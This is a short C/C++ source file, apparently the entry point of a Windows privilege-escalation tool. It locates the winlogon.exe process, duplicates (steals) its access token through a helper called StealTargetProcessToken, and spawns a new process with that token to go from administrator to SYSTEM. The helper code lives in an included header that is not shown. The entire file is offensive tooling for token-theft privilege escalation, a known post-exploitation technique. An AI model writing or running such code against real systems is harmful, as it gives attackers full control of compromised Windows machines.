#include "DupeToken.h"

int main()
{

	DWORD ProcessId = 0;
	HANDLE DupedTokenHandle = NULL;

	if (!GetRemoteId(L"winlogon.exe", &ProcessId))
	{
		PRINT_ERROR("GetRemoteId");
		return 1;
	}

	if (!StealTargetProcessToken(ProcessId, &DupedTokenHandle))
	{
		PRINT_ERROR("StealTargetProcessToken");
		return 1;
	}

	if (!SpawnProcessAdminToSystem(DupedTokenHandle))
	{
		PRINT_ERROR("SpawnProcessAdminToSystem");
		return 1;
	}

	return 0;

}